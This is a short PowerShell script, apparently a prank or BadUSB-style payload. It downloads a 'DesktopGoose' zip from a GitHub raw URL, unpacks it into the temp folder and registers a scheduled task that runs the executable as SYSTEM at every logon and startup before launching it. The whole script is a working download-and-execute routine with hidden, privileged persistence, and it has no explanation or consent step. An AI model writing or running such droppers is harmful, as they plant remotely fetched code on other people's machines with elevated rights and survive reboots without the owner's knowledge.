$gooseUrl = "https://raw.githubusercontent.com/giaosoissomsm/Webhooks/main/DesktopGoose.zip"
$tempPath = "$env:TEMP\goose"
$zipPath = "$tempPath\goose.zip"
$exePath = "$tempPath\GooseDesktop.exe"
$taskName = "RunDesktopGoose"
New-Item -ItemType Directory -Path $tempPath -Force | Out-Null
Invoke-WebRequest -Uri $gooseUrl -OutFile $zipPath
Expand-Archive -Path $zipPath -DestinationPath $tempPath -Force
Move-Item -Path "$tempPath\DesktopGoose v0.31\*" -Destination $tempPath -Force
Remove-Item -Path "$tempPath\DesktopGoose v0.31" -Recurse -Force
$action = New-ScheduledTaskAction -Execute $exePath
$trigger1 = New-ScheduledTaskTrigger -AtLogOn
$trigger2 = New-ScheduledTaskTrigger -AtStartup
$principal = New-ScheduledTaskPrincipal -UserId "SYSTEM" -LogonType ServiceAccount -RunLevel Highest
$task = New-ScheduledTask -Action $action -Trigger $trigger1, $trigger2 -Principal $principal
Register-ScheduledTask -TaskName $taskName -InputObject $task -Force
Start-Process -FilePath "$env:TEMP\goose\GooseDesktop.exe"
